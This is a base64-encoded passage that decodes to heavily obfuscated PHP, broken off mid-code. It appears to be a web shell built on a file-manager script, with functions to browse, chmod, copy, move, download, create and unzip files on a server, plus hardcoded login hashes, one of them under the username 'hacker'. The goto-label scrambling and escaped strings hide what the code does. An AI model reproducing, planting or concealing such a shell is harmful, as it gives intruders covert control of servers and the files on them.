JG9iamVjdHMgYXMgJGZpbGUpIHsgaWYgKCRmaWxlICE9ICJceDJlIiAmJiAkZmlsZSAhPSAiXHgyZVx4MmUiKSB7IGlmICghZm1fcmNobW9kKCRwYXRoIC4gIlx4MmYiIC4gJGZpbGUsICRmaWxlbW9kZSwgJGRpcm1vZGUpKSB7IHJldHVybiBmYWxzZTsgfSB9IH0gfSByZXR1cm4gdHJ1ZTsgfSBlbHNlaWYgKGlzX2xpbmsoJHBhdGgpKSB7IHJldHVybiB0cnVlOyB9IGVsc2VpZiAoaXNfZmlsZSgkcGF0aCkpIHsgcmV0dXJuIGNobW9kKCRwYXRoLCAkZmlsZW1vZGUpOyB9IHJldHVybiBmYWxzZTsgfSBnb3RvIFQ3ZmIyOyBHb244djogPz4KICAgICAgICAgICAgICAgIDx0aD48P3BocCAgZ290byBQTjdZMjsgQTNUNHc6IGRlZmluZWQoIlx4NDZceDRkXHg1ZlwxMTBceDQ5XHg0N1x4NDhcMTE0XDExMVx4NDdcMTEwXDEyNFwxMTJcMTIzXDEzN1x4NTNcMTI0XDEzMVx4NGNceDQ1IikgfHwgZGVmaW5lKCJceDQ2XHg0ZFx4NWZceDQ4XHg0OVx4NDdceDQ4XHg0Y1wxMTFceDQ3XHg0OFx4NTRceDRhXDEyM1wxMzdcMTIzXDEyNFwxMzFcMTE0XHg0NSIsICRoaWdobGlnaHRqc19zdHlsZSk7IGdvdG8gVzB3OXY7IHd2Z2prOiBkZWZpbmUoIlx4NDZceDRkXDEzN1x4NTVcMTIzXHg0NVx4NWZceDQxXHg1NVx4NTRceDQ4IiwgJHVzZV9hdXRoKTsgZ290byBzQjNNVTsgaHhhRmM6ICRhdXRoX3VzZXJzID0gYXJyYXkoIlx4NzhcMTcyXDE1N1wxNjVceDcyXDE2NCIgPT4gIlw0NFx4MzJcMTcxXDQ0XDYxXDYwXHgyNFx4N2FcNzFcMTUwXDExN1wxMTFcMTUyXHg0MVwxNDFcMTUwXHg3OFwxNjVceDM0XDExNFx4MzZcMTE0XDEwN1x4NjVceDQyXDE2NVx4NjlceDc5XHg2NVx4MmVceDZiXDE0MlwxNDZceDZkXHgzOFx4NzdcMTMwXHg2NVx4NmVcMTUzXDE1N1x4NzVcMTU2XHgzOVw2M1x4NzhcMTEwXHgzOVx4NzJcMTQxXHg0Ylx4NzBcMTYwXDYzXDY2XDExMlwxNDFcNTdcMTIwXHg1MyIsICJceDY4XDE0MVwxNDNcMTUzXHg2NVwxNjIiID0+ICJceDI0XDYyXDE3MVw0NFw2MVw2MFx4MjRceDc1XHg2M1x4NzJceDQxXDExNFx4MzJceDQyXHg0Y1wxNzJceDU4XDcwXHg0OVx4MzhcNTZcNjJcMTQxXDEwNVw2NVwxNjVcMTIzXDE0NFx4NzVceDRjXHg0YVx4MzRceDc1XDE1NVx4MzJceDZmXHgyZVwxNzFcNTZceDQ3XHg2NVwxMjNcNTZcMTU1XDExM1x4NzNceDM3XDE2MFwxMzFceDMyXHg2OVx4NDlcNjBcMTU1XHg1NlwxNTVceDcwXDExM1x4NzlceDc5Iik7IGdvdG8gUWNqRHA7IFQ3ZmIyOiBmdW5jdGlvbiBmbV9pc192YWxpZF9leHQoJGZpbGVuYW1lKSB7ICRhbGxvd2VkID0gRk1fRklMRV9FWFRFTlNJT04gPyBleHBsb2RlKCJcNTQiLCBGTV9GSUxFX0VYVEVOU0lPTikgOiBmYWxzZTsgJGV4dCA9IHBhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsgJGlzRmlsZUFsbG93ZWQgPSAkYWxsb3dlZCA/IGluX2FycmF5KCRleHQsICRhbGxvd2VkKSA6IHRydWU7IHJldHVybiAkaXNGaWxlQWxsb3dlZCA/IHRydWUgOiBmYWxzZTsgfSBnb3RvIGs3cmgxOyBhV1AwSDogJGlwX2JsYWNrbGlzdCA9IGFycmF5KCJceDMwXDU2XDYwXDU2XDYwXHgyZVx4MzAiLCAiXDcyXDcyIik7IGdvdG8gZ3BtTjc7IFhDVlFROiBmdW5jdGlvbiBmbV9kb3dubG9hZF9maWxlKCRmaWxlTG9jYXRpb24sICRmaWxlTmFtZSwgJGNodW5rU2l6ZSA9IDEwMjQpIHsgaWYgKGNvbm5lY3Rpb25fc3RhdHVzKCkgIT0gMCkgeyByZXR1cm4gZmFsc2U7IH0gJGV4dGVuc2lvbiA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsgJGNvbnRlbnRUeXBlID0gZm1fZ2V0X2ZpbGVfbWltZXMoJGV4dGVuc2lvbik7IGhlYWRlcigiXDEwM1wxNDFceDYzXDE1MFx4NjVcNTVceDQzXDE1N1wxNTZcMTY0XDE2MlwxNTdcMTU0XHgzYVw0MFwxNjBcMTY1XDE0Mlx4NmNceDY5XHg2MyIpOyBoZWFkZXIoIlx4NDNcMTU3XHg2ZVx4NzRceDY1XDE1Nlx4NzRcNTVcMTI0XHg3MlwxNDFcMTU2XDE2M1wxNDZceDY1XDE2Mlx4MmRcMTA1XHg2ZVwxNDNceDZmXHg2NFwxNTFcMTU2XDE0N1x4M2FceDIwXDE0Mlx4NjlcMTU2XDE0MVx4NzJceDc5XDEyIik7IGhlYWRlcigiXHg0M1x4NmZceDZlXHg3NFwxNDVcMTU2XDE2NFw1NVx4NTRcMTcxXHg3MFx4NjVcNzJceDIwXDQ0XDE0M1wxNTdceDZlXDE2NFwxNDVcMTU2XDE2NFwxMjRcMTcxXDE2MFwxNDUiKTsgJGNvbnRlbnREaXNwb3NpdGlvbiA9ICJcMTQxXHg3NFx4NzRcMTQxXDE0M1wxNTBcMTU1XHg2NVwxNTZcMTY0IjsgaWYgKHN0cnN0cigkX1NFUlZFUlsiXHg0OFx4NTRceDU0XDEyMFwxMzdceDU1XDEyM1wxMDVceDUyXHg1Zlx4NDFcMTA3XDEwNVwxMTZcMTI0Il0sICJcMTE1XDEyM1wxMTFceDQ1IikpIHsgJGZpbGVOYW1lID0gcHJlZ19yZXBsYWNlKCJceDJmXHg1Y1x4MmVcNTciLCAiXHgyNVx4MzJcMTQ1IiwgJGZpbGVOYW1lLCBzdWJzdHJfY291bnQoJGZpbGVOYW1lLCAiXDU2IikgLSAxKTsgaGVhZGVyKCJceDQzXDE1N1wxNTZcMTY0XDE0NVwxNTZcMTY0XHgyZFwxMDRceDY5XDE2M1wxNjBcMTU3XDE2M1x4NjlcMTY0XDE1MVx4NmZceDZlXDcyXDQweyRjb250ZW50RGlzcG9zaXRpb259XDczXHg2NlwxNTFceDZjXHg2NVwxNTZcMTQxXHg2ZFx4NjVcNzVceDIyeyRmaWxlTmFtZX1ceDIyIik7IH0gZWxzZSB7IGhlYWRlcigiXDEwM1x4NmZceDZlXDE2NFx4NjVcMTU2XHg3NFx4MmRceDQ0XHg2OVwxNjNcMTYwXHg2ZlwxNjNceDY5XHg3NFwxNTFceDZmXHg2ZVx4M2FcNDB7JGNvbnRlbnREaXNwb3NpdGlvbn1cNzNceDY2XHg2OVwxNTRceDY1XDE1NlwxNDFcMTU1XHg2NVw3NVw0MnskZmlsZU5hbWV9XDQyIik7IH0gaGVhZGVyKCJceDQxXDE0M1wxNDNceDY1XDE2MFx4NzRcNTVceDUyXDE0MVx4NmVcMTQ3XHg2NVx4NzNcNzJceDIwXDE0MlwxNzFcMTY0XHg2NVx4NzMiKTsgJHJhbmdlID0gMDsgJHNpemUgPSBmaWxlc2l6ZSgkZmlsZUxvY2F0aW9uKTsgaWYgKGlzc2V0KCRfU0VSVkVSWyJcMTEwXHg1NFwxMjRcMTIwXHg1ZlwxMjJcMTAxXHg0ZVx4NDdcMTA1Il0pKSB7IGxpc3QoJGEsICRyYW5nZSkgPSBleHBsb2RlKCJceDNkIiwgJF9TRVJWRVJbIlwxMTBcMTI0XDEyNFwxMjBceDVmXHg1MlwxMDFceDRlXHg0N1x4NDUiXSk7IHN0cl9yZXBsYWNlKCRyYW5nZSwgIlx4MmQiLCAkcmFuZ2UpOyAkc2l6ZTIgPSAkc2l6ZSAtIDE7ICRuZXdfbGVuZ3RoID0gJHNpemUgLSAkcmFuZ2U7IGhlYWRlcigiXDExMFx4NTRceDU0XDEyMFw1N1x4MzFcNTZceDMxXDQwXHgzMlx4MzBcNjZceDIwXDEyMFwxNDFcMTYyXHg3NFx4NjlcMTQxXHg2Y1x4MjBcMTAzXHg2Zlx4NmVceDc0XHg2NVwxNTZcMTY0Iik7IGhlYWRlcigiXDEwM1wxNTdceDZlXHg3NFx4NjVceDZlXDE2NFx4MmRcMTE0XHg2NVx4NmVceDY3XDE2NFwxNTBceDNhXHgyMHskbmV3X2xlbmd0aH0iKTsgaGVhZGVyKCJcMTAzXDE1N1wxNTZceDc0XHg2NVwxNTZcMTY0XHgyZFx4NTJceDYxXDE1Nlx4NjdceDY1XHgzYVw0MFwxNDJceDc5XHg3NFwxNDVceDczXDQweyRyYW5nZX17JHNpemUyfVx4MmZ7JHNpemV9Iik7IH0gZWxzZSB7ICRzaXplMiA9ICRzaXplIC0gMTsgaGVhZGVyKCJcMTAzXHg2ZlwxNTZceDc0XHg2NVwxNTZcMTY0XDU1XHg1Mlx4NjFceDZlXDE0N1wxNDVceDNhXHgyMFwxNDJcMTcxXDE2NFwxNDVcMTYzXHgyMFx4MzBcNTV7JHNpemUyfVx4MmZ7JHNpemV9Iik7IGhlYWRlcigiXDEwM1x4NmZceDZlXHg3NFwxNDVcMTU2XDE2NFx4MmRcMTE0XHg2NVwxNTZceDY3XDE2NFwxNTBcNzJceDIwIiAuICRzaXplKTsgfSBpZiAoJHNpemUgPT0gMCkgeyBkaWUoIlwxMzJceDY1XHg3Mlx4NmZceDIwXHg2MlwxNzFceDc0XDE0NVx4MjBceDY2XDE1MVx4NmNceDY1XHgyMVx4MjBcMTAxXDE0Mlx4NmZceDcyXHg3NFx4NjlcMTU2XHg2N1w0MFwxNDRcMTU3XHg3N1wxNTZceDZjXHg2Zlx4NjFceDY0Iik7IH0gQGluaV9zZXQoIlx4NmRcMTQxXDE0N1x4NjlceDYzXHg1ZlwxNjFceDc1XDE1N1x4NzRceDY1XDE2M1wxMzdcMTYyXHg3NVx4NmVceDc0XHg2OVwxNTVceDY1IiwgMCk7ICRmcCA9IGZvcGVuKCJ7JGZpbGVMb2NhdGlvbn0iLCAiXHg3MlwxNDIiKTsgZnNlZWsoJGZwLCAkcmFuZ2UpOyB3aGlsZSAoIWZlb2YoJGZwKSBhbmQgY29ubmVjdGlvbl9zdGF0dXMoKSA9PSAwKSB7IHNldF90aW1lX2xpbWl0KDApOyBwcmludCBAZnJlYWQoJGZwLCAxMDI0ICogJGNodW5rU2l6ZSk7IGZsdXNoKCk7IG9iX2ZsdXNoKCk7IH0gZmNsb3NlKCRmcCk7IHJldHVybiBjb25uZWN0aW9uX3N0YXR1cygpID09IDAgYW5kICFjb25uZWN0aW9uX2Fib3J0ZWQoKTsgfSBnb3RvIFRjelhwOyBRYzBsVTogZnVuY3Rpb24gZm1fZ2V0X3RleHRfZXh0cygpIHsgcmV0dXJuIGFycmF5KCJceDc0XDE3MFx4NzQiLCAiXDE0M1x4NzNcMTYzIiwgIlx4NjlcMTU2XHg2OSIsICJceDYzXHg2Zlx4NmVcMTQ2IiwgIlwxNTRcMTU3XHg2NyIsICJceDY4XHg3NFwxNDFceDYzXHg2M1wxNDVcMTYzXDE2MyIsICJcMTYwXDE0MVx4NzNcMTYzXDE2N1x4NjQiLCAiXHg2NlwxNjRcMTYwXHg3MVwxNjVceDZmXHg3NFwxNDEiLCAiXHg3M1wxNjFceDZjIiwgIlx4NmFceDczIiwgIlwxNTJcMTYzXDE1N1wxNTYiLCAiXHg3M1wxNTAiLCAiXHg2M1x4NmZceDZlXHg2NlwxNTFcMTQ3IiwgIlwxNjBcMTUwXDE2MCIsICJceDcwXDE1MFwxNjBceDM0IiwgIlwxNjBcMTUwXDE2MFx4MzUiLCAiXDE2MFwxNTBcMTYwXDE2MyIsICJcMTYwXHg2OFx4NzRceDZkXDE1NCIsICJceDY4XDE2NFwxNTUiLCAiXHg2OFx4NzRcMTU1XDE1NCIsICJceDczXDE1MFx4NzRceDZkXDE1NCIsICJceDc4XDE1MFwxNjRceDZkXHg2YyIsICJcMTcwXDE1NVx4NmMiLCAiXDE3MFwxNjNcMTU0IiwgIlwxNTVcNjNceDc1IiwgIlx4NmRcNjNcMTY1XHgzOCIsICJceDcwXDE1NFx4NzMiLCAiXDE0M1x4NzVceDY1IiwgIlx4NjVceDZkXHg2YyIsICJcMTU1XDE2M1x4NjciLCAiXHg2M1x4NzNcMTY2IiwgIlx4NjJceDYxXHg3NCIsICJcMTY0XHg3N1wxNTFceDY3IiwgIlwxNjRcMTYwXDE1NCIsICJcMTU1XHg2NCIsICJcMTQ3XHg2OVwxNjRcMTUxXHg2N1wxNTZceDZmXHg3MlwxNDUiLCAiXDE1NFx4NjVcMTYzXHg3MyIsICJceDczXDE0MVx4NzNceDczIiwgIlwxNjNceDYzXHg3M1wxNjMiLCAiXDE0MyIsICJcMTQzXHg3MFwxNjAiLCAiXDE0M1x4NzMiLCAiXHg3MFx4NzkiLCAiXDE1NVwxNDFcMTYwIiwgIlx4NmNcMTU3XDE0M1wxNTMiLCAiXHg2NFwxNjRcMTQ0IiwgIlwxNjNceDc2XDE0NyIsICJcMTYzXDE0M1wxNjNceDczIiwgIlx4NjFcMTYzXDE2MCIsICJcMTQxXHg3M1x4NzBcMTcwIiwgIlwxNDFceDczXHg3OCIsICJcMTQxXDE2M1wxNTVceDc4IiwgIlwxNDFceDczXHg2OFwxNzAiLCAiXHg2YVx4NzNcMTcwIiwgIlwxNTJceDczXDE2MCIsICJcMTUyXDE2M1wxNjBceDc4IiwgIlwxNDNceDY2XDE1NSIsICJceDYzXDE0N1wxNTEiKTsgfSBnb3RvIHF5N3dKOyBUY3pYcDogZnVuY3Rpb24gZm1fZ2V0X3RoZW1lKCkgeyAkcmVzdWx0ID0gJyc7IGlmIChGTV9USEVNRSA9PSAiXHg2NFwxNDFceDcyXHg2YiIpIHsgJHJlc3VsdCA9ICJceDc0XDE0NVx4NzhceDc0XDU1XHg3N1wxNTBceDY5XHg3NFx4NjVcNDBceDYyXDE0N1x4MmRcMTQ0XDE0MVwxNjJceDZiIjsgfSByZXR1cm4gJHJlc3VsdDsgfSBnb3RvIHVORHRMOyBDMGsxVTogZGVmaW5lZCgiXHg0NlwxMTVcMTM3XDEwNlwxMTFcMTE0XDEwNVx4NWZceDQ1XDEzMFx4NTRcMTA1XHg0ZVwxMjNceDQ5XHg0ZlwxMTYiKSB8fCBkZWZpbmUoIlx4NDZcMTE1XDEzN1x4NDZcMTExXHg0Y1x4NDVcMTM3XHg0NVwxMzBceDU0XDEwNVx4NGVcMTIzXHg0OVwxMTdcMTE2IiwgJGFsbG93ZWRfZmlsZV9leHRlbnNpb25zKTsgZ290byBwZjBDRDsga3ljeHQ6ICRyZXBvcnRfZXJyb3JzID0gaXNzZXQoJGNmZy0+ZGF0YVsiXHg2NVx4NzJceDcyXHg2ZlwxNjJcMTM3XHg3Mlx4NjVcMTYwXHg2Zlx4NzJcMTY0XHg2OVx4NmVceDY3Il0pID8gJGNmZy0+ZGF0YVsiXDE0NVwxNjJcMTYyXHg2Zlx4NzJceDVmXHg3Mlx4NjVcMTYwXHg2Zlx4NzJcMTY0XHg2OVwxNTZcMTQ3Il0gOiB0cnVlOyBnb3RvIExEbU9yOyBwZjBDRDogZGVmaW5lZCgiXHg0NlwxMTVceDVmXHg1NVwxMjBceDRjXDExN1x4NDFceDQ0XHg1Zlx4NDVceDU4XDEyNFx4NDVcMTE2XHg1M1wxMTFceDRmXDExNiIpIHx8IGRlZmluZSgiXHg0Nlx4NGRceDVmXHg1NVwxMjBceDRjXDExN1x4NDFcMTA0XHg1Zlx4NDVcMTMwXDEyNFwxMDVcMTE2XHg1M1x4NDlceDRmXDExNiIsICRhbGxvd2VkX3VwbG9hZF9leHRlbnNpb25zKTsgZ290byB1ZTZUaDsgSFVseDA6IGZtX3Nob3dfZm9vdGVyKCk7IGdvdG8gaWN0SDc7IE51dXJVOiAkdGFibGVUaGVtZSA9IEZNX1RIRU1FID09ICJceDY0XHg2MVwxNjJcMTUzIiA/ICJcMTY0XHg2NVwxNzBcMTY0XDU1XHg3N1x4NjhceDY5XDE2NFwxNDVcNDBceDYyXDE0N1x4MmRceDY0XDE0MVx4NzJceDZiXHgyMFx4NzRcMTQxXHg2Mlx4NmNceDY1XHgyZFx4NjRcMTQxXDE2Mlx4NmIiIDogIlwxNDJceDY3XHgyZFwxNjdceDY4XHg2OVwxNjRcMTQ1IjsgZ290byBRTk9DSjsgbWE1eVQ6ICRwID0gZm1fY2xlYW5fcGF0aCgkcCk7IGdvdG8gRTJiN2M7IGtUc0JZOiBpZiAoaXNzZXQoJF9QT1NUWyJcMTQ2XDE1MVwxNTRceDY1Il0sICRfUE9TVFsiXHg2M1wxNTdcMTYwXHg3OVx4NWZceDc0XHg2ZiJdLCAkX1BPU1RbIlwxNDZceDY5XHg2ZVwxNTFcMTYzXHg2OCJdKSAmJiAhRk1fUkVBRE9OTFkpIHsgJHBhdGggPSBGTV9ST09UX1BBVEg7IGlmIChGTV9QQVRIICE9ICcnKSB7ICRwYXRoIC49ICJcNTciIC4gRk1fUEFUSDsgfSAkY29weV90b19wYXRoID0gRk1fUk9PVF9QQVRIOyAkY29weV90byA9IGZtX2NsZWFuX3BhdGgoJF9QT1NUWyJcMTQzXHg2Zlx4NzBcMTcxXHg1ZlwxNjRceDZmIl0pOyBpZiAoJGNvcHlfdG8gIT0gJycpIHsgJGNvcHlfdG9fcGF0aCAuPSAiXDU3IiAuICRjb3B5X3RvOyB9IGlmICgkcGF0aCA9PSAkY29weV90b19wYXRoKSB7IGZtX3NldF9tc2cobG5nKCJceDUwXHg2MVx4NzRceDY4XHg3M1x4MjBceDZkXHg3NVx4NzNceDc0XDQwXDE0Mlx4NjVceDIwXHg2ZVwxNTdcMTY0XDQwXDE0NVwxNjFcMTY1XDE0MVwxNTQiKSwgIlwxNDFceDZjXHg2NVwxNjJcMTY0Iik7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gIlx4M2ZcMTYwXDc1IiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gaWYgKCFpc19kaXIoJGNvcHlfdG9fcGF0aCkpIHsgaWYgKCFmbV9ta2RpcigkY29weV90b19wYXRoLCB0cnVlKSkgeyBmbV9zZXRfbXNnKCJcMTI1XHg2ZVx4NjFceDYyXHg2Y1wxNDVcNDBcMTY0XDE1N1x4MjBceDYzXDE2MlwxNDVceDYxXDE2NFx4NjVcNDBceDY0XDE0NVwxNjNcMTY0XDE1MVx4NmVcMTQxXDE2NFx4NjlceDZmXDE1Nlx4MjBceDY2XHg2ZlwxNTRcMTQ0XHg2NVx4NzIiLCAiXDE0NVx4NzJceDcyXHg2Zlx4NzIiKTsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAiXHgzZlx4NzBceDNkIiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gfSAkbW92ZSA9IGlzc2V0KCRfUE9TVFsiXDE1NVx4NmZcMTY2XHg2NSJdKTsgJGVycm9ycyA9IDA7ICRmaWxlcyA9ICRfUE9TVFsiXDE0NlwxNTFceDZjXDE0NSJdOyBpZiAoaXNfYXJyYXkoJGZpbGVzKSAmJiBjb3VudCgkZmlsZXMpKSB7IGZvcmVhY2ggKCRmaWxlcyBhcyAkZikgeyBpZiAoJGYgIT0gJycpIHsgJGZyb20gPSAkcGF0aCAuICJceDJmIiAuICRmOyAkZGVzdCA9ICRjb3B5X3RvX3BhdGggLiAiXDU3IiAuICRmOyBpZiAoJG1vdmUpIHsgJHJlbmFtZSA9IGZtX3JlbmFtZSgkZnJvbSwgJGRlc3QpOyBpZiAoJHJlbmFtZSA9PT0gZmFsc2UpIHsgJGVycm9ycysrOyB9IH0gZWxzZSB7IGlmICghZm1fcmNvcHkoJGZyb20sICRkZXN0KSkgeyAkZXJyb3JzKys7IH0gfSB9IH0gaWYgKCRlcnJvcnMgPT0gMCkgeyAkbXNnID0gJG1vdmUgPyAiXDEyM1x4NjVcMTU0XDE0NVwxNDNceDc0XHg2NVx4NjRceDIwXDE0Nlx4NjlceDZjXHg2NVx4NzNceDIwXDE0MVx4NmVceDY0XDQwXHg2NlwxNTdceDZjXDE0NFx4NjVceDcyXDE2M1w0MFwxNTVcMTU3XHg3Nlx4NjVceDY0IiA6ICJcMTIzXDE0NVx4NmNceDY1XHg2M1wxNjRceDY1XHg2NFx4MjBceDY2XHg2OVx4NmNceDY1XHg3M1w0MFwxNDFcMTU2XDE0NFx4MjBcMTQ2XHg2Zlx4NmNceDY0XHg2NVx4NzJcMTYzXDQwXDE0M1x4NmZceDcwXHg2OVx4NjVceDY0IjsgZm1fc2V0X21zZygkbXNnKTsgfSBlbHNlIHsgJG1zZyA9ICRtb3ZlID8gIlwxMDVcMTYyXHg3MlwxNTdceDcyXHgyMFx4NzdcMTUwXHg2OVwxNTRcMTQ1XDQwXDE1NVwxNTdcMTY2XDE1MVwxNTZcMTQ3XHgyMFx4NjlceDc0XDE0NVx4NmRceDczIiA6ICJceDQ1XHg3Mlx4NzJcMTU3XHg3Mlw0MFx4NzdceDY4XDE1MVx4NmNceDY1XDQwXDE0M1x4NmZcMTYwXDE3MVwxNTFcMTU2XDE0N1w0MFx4NjlcMTY0XDE0NVwxNTVcMTYzIjsgZm1fc2V0X21zZygkbXNnLCAiXHg2NVx4NzJceDcyXHg2ZlwxNjIiKTsgfSB9IGVsc2UgeyBmbV9zZXRfbXNnKGxuZygiXHg0ZVwxNTdcMTY0XHg2OFwxNTFcMTU2XHg2N1x4MjBceDczXHg2NVwxNTRcMTQ1XDE0M1wxNjRceDY1XHg2NCIpLCAiXDE0MVx4NmNceDY1XDE2Mlx4NzQiKTsgfSBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJceDNmXHg3MFx4M2QiIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsgfSBnb3RvIEVsNmp5OyBibkhpWDogJGlpID0gMzM5OTsgZ290byBRaXhTajsgaUdOTUY6IGlmIChpc3NldCgkX0dFVFsiXDE1Nlx4NjVceDc3Il0pICYmIGlzc2V0KCRfR0VUWyJcMTY0XHg3OVwxNjBcMTQ1Il0pICYmICFGTV9SRUFET05MWSkgeyAkdHlwZSA9ICRfR0VUWyJceDc0XDE3MVx4NzBceDY1Il07ICRuZXcgPSBzdHJfcmVwbGFjZSgiXDU3IiwgJycsIGZtX2NsZWFuX3BhdGgoc3RyaXBfdGFncygkX0dFVFsiXHg2ZVx4NjVcMTY3Il0pKSk7IGlmIChmbV9pc3ZhbGlkX2ZpbGVuYW1lKCRuZXcpICYmICRuZXcgIT0gJycgJiYgJG5ldyAhPSAiXHgyZVw1NiIgJiYgJG5ldyAhPSAiXHgyZSIpIHsgJHBhdGggPSBGTV9ST09UX1BBVEg7IGlmIChGTV9QQVRIICE9ICcnKSB7ICRwYXRoIC49ICJcNTciIC4gRk1fUEFUSDsgfSBpZiAoJF9HRVRbIlx4NzRcMTcxXDE2MFwxNDUiXSA9PSAiXHg2NlwxNTFcMTU0XHg2NSIpIHsgaWYgKCFmaWxlX2V4aXN0cygkcGF0aCAuICJceDJmIiAuICRuZXcpKSB7IGlmIChmbV9pc192YWxpZF9leHQoJG5ldykpIHsgQGZvcGVuKCRwYXRoIC4gIlx4MmYiIC4gJG5ldywgIlx4NzciKSBvciBkaWUoIlx4NDNceDYxXHg2ZVx4NmVceDZmXHg3NFx4MjBceDZmXHg3MFx4NjVcMTU2XHgyMFx4NjZceDY5XHg2Y1x4NjVcNzJceDIwXDQwIiAuICRuZXcpOyBmbV9zZXRfbXNnKHNwcmludGYobG5nKCJcMTA2XHg2OVwxNTRceDY1IikgLiAiXHgyMFw3NFx4NjJceDNlXHgyNVwxNjNcNzRceDJmXDE0Mlw3Nlw0MCIgLiBsbmcoIlwxMDNcMTYyXHg2NVwxNDFcMTY0XHg2NVwxNDQiKSwgZm1fZW5jKCRuZXcpKSk7IH0gZWxzZSB7IGZtX3NldF9tc2cobG5nKCJcMTA2XDE1MVwxNTRceDY1XHgyMFwxNDVceDc4XHg3NFx4NjVceDZlXDE2M1wxNTFcMTU3XDE1Nlx4MjBcMTUxXDE2M1w0MFwxNTZcMTU3XDE2NFx4MjBceDYxXDE1NFx4NmNceDZmXDE2N1x4NjVceDY0IiksICJcMTQ1XHg3MlwxNjJceDZmXDE2MiIpOyB9IH0gZWxzZSB7IGZtX3NldF9tc2coc3ByaW50ZihsbmcoIlx4NDZceDY5XDE1NFwxNDUiKSAuICJceDIwXDc0XHg2Mlx4M2VcNDVceDczXHgzY1w1N1wxNDJceDNlXDQwIiAuIGxuZygiXDE0MVwxNTRcMTYyXDE0NVwxNDFceDY0XDE3MVx4MjBcMTQ1XHg3OFx4NjlcMTYzXHg3NFwxNjMiKSwgZm1fZW5jKCRuZXcpKSwgIlwxNDFceDZjXHg2NVx4NzJcMTY0Iik7IH0gfSBlbHNlIHsgaWYgKGZtX21rZGlyKCRwYXRoIC4gIlw1NyIgLiAkbmV3LCBmYWxzZSkgPT09IHRydWUpIHsgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygiXDEwNlx4NmZceDZjXHg2NFx4NjVceDcyIikgLiAiXHgyMFw3NFx4NjJceDNlXDQ1XHg3M1w3NFw1N1x4NjJceDNlXDQwIiAuIGxuZygiXHg0M1wxNjJceDY1XHg2MVx4NzRceDY1XDE0NCIpLCAkbmV3KSk7IH0gZWxzZWlmIChmbV9ta2RpcigkcGF0aCAuICJceDJmIiAuICRuZXcsIGZhbHNlKSA9PT0gJHBhdGggLiAiXDU3IiAuICRuZXcpIHsgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygiXHg0NlwxNTdceDZjXHg2NFx4NjVceDcyIikgLiAiXHgyMFx4M2NceDYyXDc2XDQ1XHg3M1w3NFx4MmZcMTQyXHgzZVw0MCIgLiBsbmcoIlx4NjFceDZjXHg3MlwxNDVcMTQxXDE0NFx4NzlcNDBcMTQ1XHg3OFwxNTFceDczXDE2NFwxNjMiKSwgZm1fZW5jKCRuZXcpKSwgIlx4NjFceDZjXHg2NVx4NzJceDc0Iik7IH0gZWxzZSB7IGZtX3NldF9tc2coc3ByaW50ZihsbmcoIlx4NDZceDZmXHg2Y1wxNDRceDY1XHg3MiIpIC4gIlx4MjBcNzRcMTQyXDc2XDQ1XHg3M1w3NFw1N1wxNDJceDNlXDQwIiAuIGxuZygiXDE1NlwxNTdceDc0XDQwXHg2M1wxNjJceDY1XDE0MVx4NzRceDY1XHg2NCIpLCBmbV9lbmMoJG5ldykpLCAiXHg2NVwxNjJceDcyXHg2Zlx4NzIiKTsgfSB9IH0gZWxzZSB7IGZtX3NldF9tc2cobG5nKCJceDQ5XHg2ZVwxNjZcMTQxXDE1NFx4NjlcMTQ0XHgyMFwxNDNcMTUwXHg2MVx4NzJceDYxXDE0M1wxNjRceDY1XHg3Mlx4NzNceDIwXHg2OVx4NmVceDIwXHg2Nlx4NjlcMTU0XDE0NVx4MjBcMTU3XHg3Mlx4MjBceDY2XHg2ZlwxNTRceDY0XDE0NVwxNjJcNDBcMTU2XHg2MVx4NmRcMTQ1IiksICJceDY1XDE2MlwxNjJcMTU3XDE2MiIpOyB9IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gIlw3N1wxNjBceDNkIiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gZ290byBHbWdjNzsgRVljdjk6IGlmIChpc3NldCgkX0dFVFsiXHg3NVwxNTZcMTcyXDE1MVx4NzAiXSkgJiYgIUZNX1JFQURPTkxZKSB7ICR1bnppcCA9ICRfR0VUWyJcMTY1XHg2ZVwxNzJceDY5XDE2MCJdOyAkdW56aXAgPSBmbV9jbGVhbl9wYXRoKCR1bnppcCk7ICR1bnppcCA9IHN0cl9yZXBsYWNlKCJcNTciLCAnJywgJHVuemlwKTsgJGlzVmFsaWQgPSBmYWxzZTsgJHBhdGggPSBGTV9ST09UX1BBVEg7IGlmIChGTV9QQVRIICE9ICcnKSB7ICRwYXRoIC49ICJcNTciIC4gRk1fUEFUSDsgfSBpZiAoJHVuemlwICE9ICcnICYmIGlzX2ZpbGUoJHBhdGggLiAiXDU3IiAuICR1bnppcCkpIHsgJHppcF9wYXRoID0gJHBhdGggLiAiXHgyZiIgLiAkdW56aXA7ICRleHQgPSBwYXRoaW5mbygkemlwX3BhdGgsIFBBVEhJTkZPX0VYVEVOU0lPTik7ICRpc1ZhbGlkID0gdHJ1ZTsgfSBlbHNlIHsgZm1fc2V0X21zZyhsbmcoIlx4NDZceDY5XHg2Y1x4NjVcNDBceDZlXDE1N1x4NzRceDIwXDE0Nlx4NmZceDc1XHg2ZVx4NjQiKSwgIlwxNDVcMTYyXHg3MlwxNTdceDcyIik7IH0gaWYgKCRleHQgPT0gIlwxNzJceDY5XHg3MCIgJiYgIWNsYXNzX2V4aXN0cygiXHg1YVx4NjlcMTYwXDEwMVwxNjJceDYzXHg2OFx4NjlcMTY2XDE0NSIpIHx8ICRleHQgPT0gIlx4NzRceDYxXHg3MiIgJiYgIWNsYXNzX2V4aXN0cygiXHg1MFx4NjhcMTQxXHg3Mlx4NDRcMTQxXHg3NFwxNDEiKSkgeyBmbV9zZXRfbXNnKGxuZygiXHg0ZlwxNjBcMTQ1XHg3MlwxNDFcMTY0XDE1MVx4NmZcMTU2XDE2M1w0MFwxNjdceDY5XHg3NFx4NjhcNDBceDYxXDE2MlwxNDNcMTUwXDE1MVwxNjZcMTQ1XDE2M1w0MFx4NjFcMTYyXH